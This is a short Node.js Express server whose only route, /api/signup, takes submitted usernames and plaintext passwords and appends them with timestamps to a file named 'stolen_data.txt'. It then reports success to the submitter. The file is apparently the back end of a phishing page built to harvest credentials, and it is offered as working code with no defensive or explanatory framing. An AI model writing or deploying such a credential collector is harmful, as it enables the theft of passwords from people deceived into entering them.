const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());

app.post('/api/signup', (req, res) => {
  const { username, password} = req.body;
  const data =`Username:${username}, Password:${password}, Timestamp:${new Date().toISOString()}\n`;
  fs.appendFile('stolen_data.txt', data, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      res.status(500).json({ error: 'Server error' });} else {
      res.status(200).json({ success: true });}  });
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
